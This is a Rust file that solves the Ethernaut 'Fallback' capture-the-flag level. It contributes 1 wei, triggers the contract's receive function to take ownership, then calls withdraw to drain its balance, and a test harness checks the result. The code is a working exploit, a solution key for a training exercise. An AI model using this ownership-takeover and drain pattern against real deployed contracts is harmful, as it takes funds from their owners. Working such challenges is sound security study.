use async_trait::async_trait;
use ethers::prelude::*;

use bindings::fallback::Fallback;

struct Solution;

#[async_trait]
impl ctf::Solution for Solution {
    type Level = ctf::EthernautLevel1;

    async fn solve(
        self,
        challenge: &Self::Level,
        offender: ctf::Actor,
    ) -> eyre::Result<()> {
        let contract =
            Fallback::new(challenge.contract_address, offender.clone());

        println!("Calling contribute()...");
        contract.contribute().value(1).send().await?.await?;

        println!("Calling receive()...");
        offender
            .send_transaction(
                TransactionRequest::new().to(contract.address()).value(1),
                None,
            )
            .await?
            .await?;

        println!("Calling withdraw()...");
        contract.withdraw().send().await?.await?;

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // #[ignore]
    #[tokio::test]
    async fn test() -> eyre::Result<()> {
        ctf::check_solution(Solution).await
    }
}
